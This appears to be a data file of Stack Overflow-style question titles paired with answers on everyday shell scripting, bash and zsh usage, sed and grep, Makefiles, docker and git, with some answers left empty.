    "How to get Command history by cursor key in Linux tclsh": "You want access to the readline library, you can do that with rlwrap:\n$ rlwrap tclsh\nUseful options are -c for file name completion, and -f to add words from a file to the completion list:\n$ rlwrap -cf my_complete_file tclsh\nSince you almost always want to use rlwrap, adding a shell alias is useful:\nalias tclsh='rlwrap tclsh'",
    "Using grep and ls -a commands": " ls -a /usr | grep '^[prs]'\nWould select from the output of ls -a /usr (which is the list of files in /usr delimited by newline characters) the lines that start by either of the p, r or s characters.\nThat's probably what your teacher is expecting but it's wrong or at least not reliable.\nFile names can be made of many lines since the newline character is as valid a character as any in a file name on Linux or any unix. So that command doesn't return the files whose name starts with p, q or s, but the lines of the filenames that start with p, q or s. Generally, you can't post-process the output of ls reliably.\n-a is to include hidden files, that is files whose name starts with .. Since you only want those that start with p, q or s, that's redundant.\nNote that:\nls /usr | grep ^[pqs]\nwould be even more wrong. First ^ is a special character in a few shells like the Bourne shell, rc, es or zsh -o extendedglob (though OK in bash or other POSIX shells).\nThen, in most shells (fish being a notable exception), [pqs] is a globbing operator. That means that ^[qps] is meant to be expanded by the shell to the list of files that match that pattern (relative to the current directory).\nSo in those shells like bash that don't treat ^ specially, if there is a file called ^p in the current directory, that will become\nls /usr | grep ^p\nIf there's no matching file, in csh, tcsh, zsh or bash -O failglob, you'll get an error message and the command will be cancelled. In zsh -o extendedglob where ^ is a globbing operator, ^[pqs] would mean any file but p, q or s.",
    "The result of docker exec command": "I found this to be working quite well:\ndocker exec -t -i my-container sh -c 'my-command; exit $?'",
    "Make a shell script to update 3 git repos": "First, I recommend against using git pull. Instead, create a safer git up alias:\ngit config --global alias.up '!git remote update -p; git merge --ff-only @{u}'\nSee this answer for an explanation of git up.\nThen you can safely script it:\n#!/bin/sh\nfor repo in repo1 repo2 repo3 repo4; do\n    (cd \"${repo}\" && git checkout master && git up)\ndone",
    "regexp (sed) suppress \"no match\" output": "sed by default prints all lines.\nWhat you want to do is:\n/patt/!d;s//repl/\nIn other words, delete lines not matching your pattern, and for lines that do match, extract particular element from it, giving capturing group number for instance. In your case it will be:\nsed -e '/^.*\\(.\\)\\([0-9][0-9]\\)\\1.*$/!d;s//\\2/'\nYou can also use -n option to suppress echoing all lines. Then line is printed only when you explicitly state it. In practice, scripts using -n are usually longer and more cumbersome to maintain. Here it will be:\nsed -ne 's/^.*\\(.\\)\\([0-9][0-9]\\)\\1.*$/\\2/p'\nThere is also grep, but your example shows why sed is sometimes better.",
    "php shell_exec() command is not working": "",
    "Setting environment variable globally without restarting Ubuntu": "The simple answer is: you cannot do this in general.\nWhy can there be no general solution?\nThe \"why?\" needs a more detailed explanation. In Linux, the environment is process-specific. Each process environment is stored in a special memory area allocated exclusively for this process.\nAs an aside: To quickly inspect the environment of a process, have a look at /proc/<pid>/env (or try /proc/self/env for the environment of the currently running process, such as your shell).\nWhen a (\"parent\") process starts another (\"child\") process (via fork(2)), the environment the environment of the parent is copied to produce the environment of the child. There is no inheritance-style association between those two environments thereafter, they are completely separate. So there is no \"global\" or \"master\" environment we could change, to achieve what you want.\nWhy not simply change the per-process environment of all running processes? The memory area for the environment is in a well-defined location (basically right before the memory allocated for the stack), so you can't easily extend it, without corrupting other critical memory areas of the process.\nPossible half-solutions for special cases\nThat said, one can imagine several special cases where you could indeed achieve what you want.\nMost obviously, if you do \"size-neutral\" changes, you could conceivable patch up all environments of all processes. For example, replace every USER=foo environment variable (if present), with USER=bar. A rather special case, I fear.\nIf you don't really need to change the environments of all processes, but only of a class of well-known ones, more creative approaches might be possible. Vorsprung's answer is an impressive demonstration of doing exactly this with only Bash processes.\nThere are probably many other special cases, where there is a possible solution. But as explained above: no solution for the general case.",
    "Executing a shell script from a PHP script": "",
    "Where are universal variables stored in the fish shell?": "Since fish version 3.0.0 the file lives in the more portable location ~/.config/fish/fish_variables \u2013 Joey Sabey (Edited to be absolute rather than relative path)\nin ~/.config/fish/fishd.(hostname)\nSince it's host-specific, I'd recommend you put settings you want to share in ~/.config/fish/config.fish",
    "pushd not working in makefile": "Each line in a makefile target recipe is run in its own shell session. This doesn't affect most recipes as they operate in the directory they need to by default. When they don't do that and you need to use cd or pushd then you need to write the commands all on the same line or tell make that the lines are continued.\nSee Splitting Recipe Lines for more details and examples.",
    "Piping stdout and stderr inside a Makefile rule": "I stumbled upon this question with the same problem and wasn't satisfied with the answer. I had a binary TLBN that failed on test case example2.TLBN.\nThis is what my make file looked at first.\nmake:\n     ./TLBN example2.TLBN > ex2_output.txt\nWhich failed with the error message I was expecting and halting the make process.\nThis is my fix:\nmake:\n    -./TLBN example2.TLBN > ex2_output.txt 2>&1\nNote the - at the beginning of the line which tells make to ignore any output to stderr.\nHope this helps someone that has a similar problem.",
    "Accessing bash completions for specific commands programmatically": "I don't really know how it works, but the awesome window manager uses the following Lua code for getting access to bash completion's result:\nhttps://github.com/awesomeWM/awesome/blob/master/lib/awful/completion.lua#L119\nVia complete -p we find complete -o bashdefault -o default -o nospace -F _git git. We remember \"_git\" for later.\nThe length of \"git l\" is 5, so we set COMP_COUNT=6. We are completing the first argument to \"git\", so COMP_CWORD=1.\nAll together we use the following script:\n__print_completions() {\n    printf '%s\\n' \"${COMPREPLY[@]}\"\n}\n\n# load bash-completion functions\nsource /etc/bash_completion\n\n# load git's completion function\n_completion_loader git\n\nCOMP_WORDS=(git l)\nCOMP_LINE='git l'\nCOMP_POINT=6\nCOMP_CWORD=1\n_git\n__print_completions\nOutput: \"log\"",
    "How to gzip all files in all sub-directories in bash": "I'd prefer gzip -r ./ which does the same thing but is shorter.",
    "Do a tail -F until matching a pattern": "Use tail's --pid option and tail will stop when the shell dies. No need to add extra to the tailed file.\nsh -c 'tail -n +0 --pid=$$ -f /tmp/foo | { sed \"/EOF/ q\" && kill $$ ;}'",
    "Floating point comparison in shell": "bc is your friend:\nkey1=\"12.3\"\nresult=\"12.2\"\nif [ $(bc <<< \"$result <= $key1\") -eq 1 ]\n    then\n    # some code here\nfi\nNote the somewhat obscure here string (<<<) notation, as a nice alternative to echo \"$result <= $key1\" | bc.\nAlso, the un-bash-like bc prints 1 for true and 0 for false.",
    "Counting commas in a line in bash": "Strip everything but the commas, and then count number of characters left:\n$ echo foo,bar,baz | tr -cd , | wc -c\n2",
    "Zsh zle shift selection": "Expanding on St\u00e9phane's excellent answer from almost 3 years ago, I added some more bindings to make the behaviour (almost) completely consistent with all of Windows' standard keyboard behaviour:\nSelection is cleared when using a navigation key (arrow, home, end) WITHOUT shift\nBackspace and Del delete an active selection\nSelection is extended to the next/previous word when using Ctrl+Shift+Left/Ctrl+Shift+Right\nShift+Home and Shift+End extend the selection to the beginning and end of line respectively. Ctrl+Shift+Home and Ctrl+Shift+End do the same.\nTwo things that are not exactly the same:\nExtending a selection to the next word includes trailing space, unlike windows. This could be fixed, but it doesn't bother me.\nTyping when there is an active selection will not delete it and replace it with the character you typed. This would seem to require a lot more work to remap the entire keyboard. Not worth the trouble to me.\nNote that the default mintty behaviour is to bind Shift+End and Shift+Home to access the scroll back buffer. This supercedes the zsh configuration; the keys never get passed through. In order for these to work, you will need to configure a different key (or disable scroll back) in /etc/minttyrc or ~/.minttyrc. See \"modifier for scrolling\" here - the simplest solution is just set ScrollMod=2 to bind it to Alt instead of Shift.\nSo everything:\n~/.minttyrc\nScrollMod=2\n~/.zshrc\nr-delregion() {\n  if ((REGION_ACTIVE)) then\n     zle kill-region\n  else \n    local widget_name=$1\n    shift\n    zle $widget_name -- $@\n  fi\n}\n\nr-deselect() {\n  ((REGION_ACTIVE = 0))\n  local widget_name=$1\n  shift\n  zle $widget_name -- $@\n}\n\nr-select() {\n  ((REGION_ACTIVE)) || zle set-mark-command\n  local widget_name=$1\n  shift\n  zle $widget_name -- $@\n}\n\nfor key     kcap   seq        mode   widget (\n    sleft   kLFT   $'\\e[1;2D' select   backward-char\n    sright  kRIT   $'\\e[1;2C' select   forward-char\n    sup     kri    $'\\e[1;2A' select   up-line-or-history\n    sdown   kind   $'\\e[1;2B' select   down-line-or-history\n\n    send    kEND   $'\\E[1;2F' select   end-of-line\n    send2   x      $'\\E[4;2~' select   end-of-line\n    \n    shome   kHOM   $'\\E[1;2H' select   beginning-of-line\n    shome2  x      $'\\E[1;2~' select   beginning-of-line\n\n    left    kcub1  $'\\EOD'    deselect backward-char\n    right   kcuf1  $'\\EOC'    deselect forward-char\n    \n    end     kend   $'\\EOF'    deselect end-of-line\n    end2    x      $'\\E4~'    deselect end-of-line\n    \n    home    khome  $'\\EOH'    deselect beginning-of-line\n    home2   x      $'\\E1~'    deselect beginning-of-line\n    \n    csleft  x      $'\\E[1;6D' select   backward-word\n    csright x      $'\\E[1;6C' select   forward-word\n    csend   x      $'\\E[1;6F' select   end-of-line\n    cshome  x      $'\\E[1;6H' select   beginning-of-line\n    \n    cleft   x      $'\\E[1;5D' deselect backward-word\n    cright  x      $'\\E[1;5C' deselect forward-word\n\n    del     kdch1   $'\\E[3~'  delregion delete-char\n    bs      x       $'^?'     delregion backward-delete-char\n\n  ) {\n  eval \"key-$key() {\n    r-$mode $widget \\$@\n  }\"\n  zle -N key-$key\n  bindkey ${terminfo[$kcap]-$seq} key-$key\n}\n\n# restore backward-delete-char for Backspace in the incremental\n# search keymap so it keeps working there:\nbindkey -M isearch '^?' backward-delete-char\nThis covers keycodes from several different keyboard configurations I have used.\nNote: the values in the \"key\" column don't mean anything, they are just used to build a named reference for zle. They could be anything. What is important is the seq, mode and widget columns.\nNote 2: You can bind pretty much any keys you want, you just need the key codes used in your console emulator. Open a regular console (without running zsh) and type Ctrl+V and then the key you want. It should emit the code. ^[ means \\E.",
    "How to get the current Linux process ID from the command line a in shell-agnostic, language-agnostic way": "From python:\n$ python\n>>> import os\n>>> os.getpid()\n12252",
    "How to remove docker images which created 7 days ago automatically?": "docker image prune provides a filter to remove images until a specific date:\ndocker image prune -a --filter \"until=$(date +'%Y-%m-%dT%H:%M:%S' --date='-15 days')\"",
    "Shell script - exiting script if variable is null or empty": "There is a built-in operator for requiring that a variable is set. This will cause the script to exit if it isn't.\ntag=${1?Need a value}\nCommonly this is used with the : no-op near the beginning of the script.\n: ${1?Need a value}\nThe conflation of \"unset or empty\" is somewhat different. There is no similar construct for exiting on an empty but set value, but you can easily use the related syntax ${var:-default} which expands to $var if it is set and nonempty, and default otherwise. There is also ${var-default} which only produces default if the variable is properly unset.\nThis can be particularly useful when you want to use set -u but need to cope with a possibly unset variable:\ncase ${var-} in '') echo \"$0: Need a value in var\" >&2; exit 1;; esac\nI somewhat prefer case over if [ \"${var-}\" = '' ], mainly because it saves me from having to wrap double quotes around ${var-}, and the pesky case of a value in $var which gets interpreted as an option to [ and gives you an error message when you least expect it. (In Bash, [[ doesn't have these problems; but I prefer to stick to POSIX shell when I can.)",
    "How to prompt for yes or no in bash? [duplicate]": "I like to use the following function:\nfunction yes_or_no {\n    while true; do\n        read -p \"$* [y/n]: \" yn\n        case $yn in\n            [Yy]*) return 0  ;;  \n            [Nn]*) echo \"Aborted\" ; return  1 ;;\n        esac\n    done\n}\nSo in your script you can use like this:\nyes_or_no \"$message\" && do_something\nIn case the user presses any key other than [yYnN] it will repeat the message.",
    "Behavior of Arrays in bash scripting and zsh shell (Start Index 0 or 1?)": "TL;DR:\nbash array indexing starts at 0 (always)\nzsh array indexing starts at 1 (unless option KSH_ARRAYS is set)\nTo always get consistent behaviour, use:\n${array[@]:offset:length}\nExplanation\nFor code which works in both bash and zsh, you need to use the offset:length syntax rather than the [subscript] syntax.\nEven for zsh-only code, you'll still need to do this (or use emulate -LR zsh) since zsh's array subscripting basis is determined by the KSH_ARRAYS option.\nE.g., to reference the first element in an array:\n${array[@]:0:1}\nHere, array[@] is all the elements, 0 is the offset (which is always 0-based), and 1 is the number of elements desired.",
    "How to find duplicate filenames (recursively) in a given directory?": "Here is another solution (based on the suggestion by @jim-mcnamara) without awk:\nSolution 1\n#!/bin/sh \ndirname=/path/to/directory\nfind $dirname -type f | sed 's_.*/__' | sort|  uniq -d| \nwhile read fileName\ndo\nfind $dirname -type f | grep \"$fileName\"\ndone\nHowever, you have to do the same search twice. This can become very slow if you have to search a lot of data. Saving the \"find\" results in a temporary file might give a better performance.\nSolution 2 (with temporary file)\n#!/bin/sh \ndirname=/path/to/directory\ntempfile=myTempfileName\nfind $dirname -type f  > $tempfile\ncat $tempfile | sed 's_.*/__' | sort |  uniq -d| \nwhile read fileName\ndo\n grep \"/$fileName\" $tempfile\ndone\n#rm -f $tempfile\nSince you might not want to write a temp file on the harddrive in some cases, you can choose the method which fits your needs. Both examples print out the full path of the file.\nBonus question here: Is it possible to save the whole output of the find command as a list to a variable?",
    "Shell script to get the process ID on Linux [duplicate]": "Using grep on the results of ps is a bad idea in a script, since some proportion of the time it will also match the grep process you've just invoked. The command pgrep avoids this problem, so if you need to know the process ID, that's a better option. (Note that, of course, there may be many processes matched.)\nHowever, in your example, you could just use the similar command pkill to kill all matching processes:\npkill ruby\nIncidentally, you should be aware that using -9 is overkill (ho ho) in almost every case - there's some useful advice about that in the text of the \"Useless Use of kill -9 form letter \":\nNo no no. Don't use kill -9.\nIt doesn't give the process a chance to cleanly:\nshut down socket connections\nclean up temp files\ninform its children that it is going away\nreset its terminal characteristics\nand so on and so on and so on.\nGenerally, send 15, and wait a second or two, and if that doesn't work, send 2, and if that doesn't work, send 1. If that doesn't, REMOVE THE BINARY because the program is badly behaved!\nDon't use kill -9. Don't bring out the combine harvester just to tidy up the flower pot.",
    "How to remove X bytes from the end of a large file without reading the whole file?": "use the function truncate\nhttp://linux.die.net/man/2/truncate\nint truncate(const char *path, off_t length);\nint ftruncate(int fd, off_t length); \ntruncate takes the file name\nftruncate takes an open file descriptor\nboth of these set the file length to length so it either truncates or elongates (in the latter case, the rest of the file will be filled with NULL/ZERO)\n[edit]\ntruncate (linux shell command) will work also\n**SYNTAX**\n\ntruncate -s integer <filename>  \n**OPTIONS**\n\n-s number specify the new file length. If the new length is smaller than the current filelength data is lost. If the new length is greater the file is padded with 0. You can specify a magnitude character to ease large numbers:\nb or B size is bytes.\nk size is 1000 bytes.\nK size is 1024 bytes.\nm size is 10^6 bytes.\nM size is 1024^2 bytes.\ng size is 10^9 bytes.\nG size is 1024^3 bytes.\n\n\n**EXAMPLES**\n\nTo shrink a file to 10 bytes:\n\ntruncate -s 10 /tmp/foo\n\nTo enlarge or shrink a file to 345 Megabytes:\n\ntruncate -s 345M /tmp/foo\n[/edit]",
    "Launch a script as root through ADB": "",
    "OS X / Linux: pipe into two processes?": "You can do this with tee and process substitution.\nprogram1 | tee >(program2) >(program3)\nThe output of program1 will be piped to whatever is inside ( ), in this case program2 and program3.",
    "Is there a command-line shortcut for \">/dev/null 2>&1\"": "You can write a function for this:\nfunction nullify() {\n  \"$@\" >/dev/null 2>&1\n}\nTo use this function:\nnullify program arg1 arg2 ...\nOf course, you can name the function whatever you want. It can be a single character for example.\nBy the way, you can use exec to redirect stdout and stderr to /dev/null temporarily. I don't know if this is helpful in your case, but I thought of sharing it.\n# Save stdout, stderr to file descriptors 6, 7 respectively.\nexec 6>&1 7>&2\n# Redirect stdout, stderr to /dev/null\nexec 1>/dev/null 2>/dev/null\n# Run program.\nprogram arg1 arg2 ...\n# Restore stdout, stderr.\nexec 1>&6 2>&7",
    "Find the number of files in a directory": "readdir is not as expensive as you may think. The knack is avoid stat'ing each file, and (optionally) sorting the output of ls.\n/bin/ls -1U | wc -l\navoids aliases in your shell, doesn't sort the output, and lists 1 file-per-line (not strictly necessary when piping the output into wc).\nThe original question can be rephrased as \"does the data structure of a directory store a count of the number of entries?\", to which the answer is no. There isn't a more efficient way of counting files than readdir(2)/getdents(2).",
    "Searching a CSV File Using Grep": "I'd jump straight to awk to test the value exactly\nawk -F, '$3 == 12' file.csv\nThis, and any regexp-based solution, assumes that the values of the first two fields do not contain commas",
    "Executing a shell command from Common Lisp": "ASDF provides a RUN-SHELL-COMMAND that works with many Common Lisp implementations including ABCL, Allegro CL, CLISP, Clozure CL, ECL, GCL, LispWorks, SBCL, CMU, XCL and SCL.\nIt takes a control string and a list of arguments like FORMAT, and synchronously executes the result using a Bourne-compatible shell. Capture output by binding an optional stream.",
    "A better Linux shell? [closed]": "You do realize bash 4 has very recently been released with a load of new features and language additions?\nShell options globstar (**/foo) does a recursive search, dirspell fixes typos during pathname expansion.\nAssociative arrays, map strings to strings, instead of just numbers to strings.\nThe autocd shell option allows changing directories by just typing the directory path instead of having to put cd in front.\nCoprocesses\n&>> and |& redirection operators that redirect both stdout and stderr\nLoads of additions to existing builtins for improved scripting convenience.\nCheck out:\nThe \"official\" changelog: http://tiswww.case.edu/php/chet/bash/CHANGES\nA short guide to some of the new features: http://bash-hackers.org/wiki/doku.php/bash4",
    "How to send special characters via mail from a shell script?": "My /usr/bin/mail is symlinked to /etc/alternatives/mail which is also symlinked to /usr/bin/bsd-mailx\nI had to specify myself the encoding in the mail header. (The -S is not supported here.)\ncat myutf8-file | mail -a \"Content-Type: text/plain; charset=UTF-8\" -s \"My Subject\" me@mail.com",
    "How to check a public RSA key file": "It's possible to use any public key format parser, including openssl or even parse key yourself as the format is not that difficult.\nCommand line tools set a non-zero exit code, when parsing fails:\nopenssl rsa -inform PEM -pubin -in pubkey.pem -noout &> /dev/null\nif [ $? != 0 ] ; then\n    echo \"this was definitely not a RSA public key in PEM format\"\n    exit 1\nfi\nJust to check any public key:\nopenssl pkey -inform PEM -pubin -in pubkey.pem -noout &> /dev/null\nif [ $? != 0 ] ; then\n    echo \"this was definitely not a public key in PEM format\"\n    exit 1\nfi",
    "hadoop fs -put command": "As user hdfs, do you have access rights to /root/ (in your local hdd)?. Usually you don't. You must copy file1.txt to a place where local hdfs user has read rights before trying to copy it to HDFS.\nTry:\ncp /root/MyHadoop/file1.txt /tmp\nchown hdfs:hdfs /tmp/file1.txt\n# older versions of Hadoop\nsudo -u hdfs hadoop fs -put /tmp/file1.txt /\n# newer versions of Hadoop\nsudo -u hdfs hdfs dfs -put /tmp/file1.txt /\n--- edit:\nTake a look at the cleaner roman-nikitchenko's answer bellow.",
    "Where to view man pages for Bash builtin commands?": "BUILTIN commands don't have separate man pages. Those are covered by help pages. You can do:\nhelp history\nor\nhelp fg",
    "how to replace a variable in shell script string": "You are missing the end of that single-quote pair in your script.\nChange from:\necho $SQL | sed -e \"s/'$BATCH_END/$BATCH_END/g\"\nTo:\necho $SQL | sed -e \"s/\\$BATCH_END/$BATCH_END/g\"\nUpdated - as per followup comment:\nTo save the result of the above replacement back into $SQL, do either of the following:\n# Preferred way\nSQL=$(echo $SQL | sed -e \"s/\\$BATCH_END/$BATCH_END/g\")\n\n# Old way\nSQL=`echo $SQL | sed -e \"s/\\$BATCH_END/$BATCH_END/g\"`\nThis is called command substitution. Either syntax ($(...) vs. enclosure by backticks) works, but the preferred one allows you to do nesting.\nThe preferred-preferred way: Herestring\nThis is probably a bit more advanced than what you care about, but doing it in the following way will save you a subprocess from having to use echo unnecessarily:\nSQL=$(sed -e \"s/\\$BATCH_END/$BATCH_END/g\" <<< $SQL)",
    "Hiding console output produced by os.system": "To answer the question based on its title in the most generic form:\nTo suppress all output from os.system(), append >/dev/null 2>&1 to the shell command, which silences both stdout and stderr; e.g.:\nimport os\nos.system('echo 3 | sudo tee /proc/sys/vm/drop_caches >/dev/null 2>&1')\nNote that os.system() by design passes output from the calling process' stdout and stderr streams through to the console (terminal) - your Python code never sees them.\nAlso, os.system() does not raise an exception if the shell command fails and instead returns an exit code; note that it takes additional work to extract the shell command's true exit code: you need to extract the high byte from the 16-bit value returned, by applying >> 8 (although you can rely on a return value other than 0 implying an error condition).\nGiven the above limitations of os.system(), it is generally worthwhile to use the functions in the subprocess module instead:\nFor instance, subprocess.check_output() could be used as follows:\nimport subprocess\nsubprocess.check_output('echo 3 | sudo tee /proc/sys/vm/drop_caches', shell=True) \nThe above will:\ncapture stdout output and return it (with the return value being ignored in the example above)\npass stderr output through; passing stderr=subprocess.STDOUT as an additional argument would also capture stderr.\nraise an error, if the shell command fails.\nNote: Python 3.5 introduced subprocess.run(), a more flexible successor to both os.system() and subprocess.check_output() - see https://docs.python.org/3.5/library/subprocess.html#using-the-subprocess-module\nNote:\nThe reason that the OP is employing tee in the first place - despite not being interested in stdout output - is that a na\u00efve attempt to use > ... instead would be interpreted before sudo is invoked, and thus fail, because the required privileges to write to /proc/sys/... haven't been granted yet.\nWhether you're using os.system() or a subprocess function, stdin is not affected by default, so if you're invoking your script from a terminal, you'll get an interactive password prompt when the sudo command is encountered (unless the credentials have been cached).",
    "List sub-directories with ls [closed]": "This should help:\nls -d */\n*/ will only match directories under the current dir. The output directory names will probably contain the trailing '/' though.",
    "sh return: can only `return' from a function or sourced script": "I guess you mean\nexit 2\nand\nexit 0\nAlso, have a second look at the syntax of test.",
    "maven calls external script on both Linux and Windows platforms": "Finally, I mixed the ideas => the <profiles> are used to set an internal variable script.extension depending on the operating system:\n<profiles>\n  <profile>\n    <id>Windows</id>\n    <activation>\n      <os>\n        <family>Windows</family>\n      </os>\n    </activation>\n    <properties>\n      <script.extension>.bat</script.extension>\n    </properties>\n  </profile>\n  <profile>\n    <id>unix</id>\n    <activation>\n      <os>\n        <family>unix</family>\n      </os>\n    </activation>\n    <properties>\n      <script.extension>.sh</script.extension>\n    </properties>\n  </profile>\n</profiles>\nThen I use the variable to complete the script filename:\n<plugin>\n  <groupId>org.codehaus.mojo</groupId>\n  <artifactId>exec-maven-plugin</artifactId>\n  <version>1.2.1</version>\n  <executions>\n    <execution>\n      <id>compile-jni</id>\n      <phase>compile</phase>\n      <goals>\n        <goal>exec</goal>\n      </goals>\n      <configuration>\n        <executable>./compile-jni${script.extension}</executable>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n  \u26a0   As noticed by Maksim for maven 3.5.4 move up the section <configuration> as shown below:  \n  <plugin>\n  <groupId>org.codehaus.mojo</groupId>\n  <artifactId>exec-maven-plugin</artifactId>\n  <configuration>\n    <executable>./compile-jni${script.extension}</executable>\n  </configuration>\n  <version>1.2.1</version>\n  <executions>\n    <execution>\n      <id>compile-jni</id>\n      <phase>compile</phase>\n      <goals>\n        <goal>exec</goal>\n     </goals>\n    </execution>\n  </executions>\n</plugin>\nI have moved the working directory from the pom.xml to the shell script. In order to simplify maintenance, the common stuff is moved within this shell scrip. Therefore, the batch file use this shell script:\ncompile-jni.bat:\ncall \"%ProgramFiles(x86)%\\Microsoft Visual Studio 10.0\\VC\\vcvarsall.bat\" x86\nbash compile-jni.sh\ncompile-jni.sh:\n#!/bin/sh\ncd src/main/cpp\nmake",
    "passing variable to bash script in a jenkins pipeline job": "",
    "Recursively move files of certain type and keep their directory structure": "It depends slightly on your O/S and, more particularly, on the facilities in your version of tar and whether you have the command cpio. It also depends a bit on whether you have newlines (in particular) in your file names; most people don't.\nOption #1\ncd /old-dir\nfind . -name '*.mov' -print | cpio -pvdumB /new-dir\nOption #2\nfind . -name '*.mov' -print | tar -c -f - -T - |\n(cd /new-dir; tar -xf -)\nThe cpio command has a pass-through (copy) mode which does exactly what you want given a list of file names, one per line, on its standard input.\nSome versions of the tar command have an option to read the list of file names, one per line, from standard input; on MacOS X, that option is -T - (where the lone - means 'standard input'). For the first tar command, the option -f - means (in the context of writing an archive with -c, write to standard output); in the second tar command, the -x option means that the -f - means 'read from standard input'.\nThere may be other options; look at the manual page or help output of tar rather carefully.\nThis process copies the files rather than moving them. The second half of the operation would be:\nfind . -name '*.mov' -exec rm -f {} +",
    "Is there any graphical \"sudo\" for Mac OS X?": "You can more ore less manage to write your own with an AppleScript shell script:\n#!/bin/sh\nosascript -e \"do shell script \\\"$*\\\" with administrator privileges\"\ncocoasudo looks aesthetically more pleasing, but this is already deployed.",
    "Calling a Python function from a shell script": "You can send the result of your functions to the standard output by asking the Python interpreter to print the result:\npython -c 'import test; print test.get_foo()'\nThe -c option simply asks Python to execute some Python commands.\nIn order to store the result in a variable, you can therefore do:\nRESULT_FOO=`python -c 'import test; print test.get_foo()'`\nor, equivalently\nRESULT=$(python -c 'import test; print test.get_foo()')\nsince backticks and $(\u2026) evaluate a command and replace it by its output.\nPS: Getting the result of each function requires parsing the configuration file each time, with this approach. This can be optimized by returning all the results in one go, with something like:\nALL_RESULTS=$(python -c 'import test; print test.get_foo(), test.get_bar()')\nThe results can then be split and put in different variables with\nRESULT_BAR=$(echo $ALL_RESULTS | cut -d' ' -f2)\nwhich takes the second result and puts it in RESULT_BAR for example (and similarly: -fn for result #n).\nPPS: As Pablo Maurin mentioned, it would probably be easier to do everything in a single interpreter (Python, but maybe also the shell), if possible, instead of calculating variables in one program and using them in another one.",
    "Deleting a folder that contains symlinks": "Generally speaking, rm doesn't \"delete\". It \"unlinks\". This means that references to a file are removed by rm. When the number of references reaches zero, the file will no longer be accessible and in time, the area of disk where it resides will be used for something else.\nWhen you rm a directory, the stuff inside the directory is unlinked. Symbolic links are (sort of like) files with the name of their targets inside them and so they're just removed. To actually figure out what they're pointing to and then unlink the target is special work and so will not be done by a generic tool.",
    "How to convert markdown to pdf in command line": "Pandoc\nI've personally liked using pandoc as it support a wide range of input and output formats.\nInstallation\nPandoc is available in most repositories: sudo apt install pandoc\nUsage\nSometimes, pandoc can tell the formats to use which makes converting easy. However, I find that this often interprets the input format as plain text which might not be what you want:\npandoc README.md -o README.pdf\nInstead, you might want to be explicit about the input/output formats to ensure a better conversion. In the below case, I'm specifically claiming the README.md is in Github-Flavored Markdown:\npandoc --from=gfm --to=pdf -o README.pdf README.md\nAgain, there are quite a few different formats and options to choose from but to be honest, the basics suffice for the majority of my needs.",
    "bash argument case for args in $@": "You can allow both --a=arg or -a arg options with a little more work:\nSTART_DATE=\"$(date '+%Y-%m-%d')\";\nLAST_DATE=\"$(date '+%Y-%m-%d')\";\nwhile [[ $# -gt 0 ]] && [[ \"$1\" == \"--\"* ]] ;\ndo\n    opt=\"$1\";\n    shift;              #expose next argument\n    case \"$opt\" in\n        \"--\" ) break 2;;\n        \"--first\" )\n           START_DATE=\"$1\"; shift;;\n        \"--first=\"* )     # alternate format: --first=date\n           START_DATE=\"${opt#*=}\";;\n        \"--last\" )\n           LAST_DATE=\"$1\"; shift;;\n        \"--last=\"* )\n           LAST_DATE=\"${opt#*=}\";;\n        \"--copy\" )\n           COPY=true;;\n        \"--remove\" )\n           REMOVE=true;;\n        \"--optional\" )\n           OPTIONAL=\"$optional_default\";;     #set to some default value\n        \"--optional=*\" )\n           OPTIONAL=\"${opt#*=}\";;             #take argument\n        *) echo >&2 \"Invalid option: $@\"; exit 1;;\n   esac\ndone\nNote the --optional argument uses a default value if \"=\" is not used, else it sets the value in the normal way.",
    "How can I extract the content between two brackets?": "Still using\ngrep\nand\nregex\ngrep -oP '\\(\\K[^\\)]+' file\n\\K means that use look around regex advanced feature. More precisely, it's a positive look-behind assertion, you can do it like this too :\ngrep -oP '(?<=\\()[^\\)]+' file\nif you lack the -P option, you can do this with\nperl\n:\nperl -lne '/\\(\\K[^\\)]+/ and print $&' file\nAnother simpler approach using\nawk\nawk -F'[()]' '{print $2}' file",
    "How to use crontab in Android?": "",
    "Remove ANSI color codes from a text file using bash": "sed -r \"s/\\x1B\\[(([0-9]{1,2})?(;)?([0-9]{1,2})?)?[m,K,H,f,J]//g\" file_name\nthis command removes the special characters and color codes from the file\nthese are some of ANSI codes: ESC[#;#H or ESC[#;#f moves cursor to line #, column # ESC[2J clear screen and home cursor ESC[K clear to end of line,\nnote in case of clear code there is neither number nor semicolon ;\nagree with below comment: if the numbers are more than 2 digit kindly use this:\nsed -r \"s/\\x1B\\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g\" filename",
    "What is a list in Bash?": "There is no data type called list in Bash. We just have arrays. In the documentation that you have quoted, the term \"list\" doesn't refer to a data type (or anything technical) - it just means a sequence of file names.\nHowever, glob expansions work very similar to array elements as far as sequential looping is considered:\nfor file in *.txt; do          # loop through the matching files\n                               # no need to worry about white spaces or glob characters in file names\n  echo \"file=$file\"\ndone\nis same as\nfiles=(*.txt)                  # put the list of matching files in an array\nfor file in \"${files[@]}\"; do  # loop through the array\n  echo \"file=$file\"\ndone\nHowever, if you were to hardcode the file names, then you need quotes to prevent word splitting and globbing:\nfor file in verycramped.txt \"quite spacious.txt\" \"too much space.txt\" \"*ry nights.txt\"; do ...\nor\nfiles=(verycramped.txt \"quite spacious.txt\" \"too much space.txt\" \"*ry nights.txt\")\nfor file in \"${files[@]}\"; do ...\nRead more about word splitting here:\nWord Splitting - Greg's Wiki\nWord Splitting - Bash Manual\nWord splitting in Bash with IFS set to a non-whitespace character\nI just assigned a variable, but echo $variable shows something else",
    "How to reset COMP_WORDBREAKS without affecting other completion script?": "Modifying $COMP_WORDBREAKS in your completion script is not the recommended way (as it is a global variable and it could affect the behavior of other completion scripts - for example ssh).\nHowever, bash completion offers some helper methods which you can use to achieve your goal.\nThe recommended way to handle non-word-breaking characters in completion words is by using the two helper methods:\n_get_comp_words_by_ref with the -n EXCLUDE option\ngets the word-to-complete without considering the characters in EXCLUDE as word breaks\n__ltrim_colon_completions\nremoves colon containing prefix from COMPREPLY items\n(a workaround for http://tiswww.case.edu/php/chet/bash/FAQ - E13)\nSo, here is a basic example of how to a handle a colon (:) in completion words:\n_mytool()\n{\n    local cur\n    _get_comp_words_by_ref -n : cur\n\n    # my implementation here\n\n    COMPREPLY=( $(compgen ..........my_implement......... -- $cur) )\n\n    __ltrim_colon_completions \"$cur\"\n}\ncomplete -F _mytool mytool\nAs a final tip, the helper methods are located in /etc/bash_completion. Take a look inside to read a detailed description of each method and to discover more helper methods.",
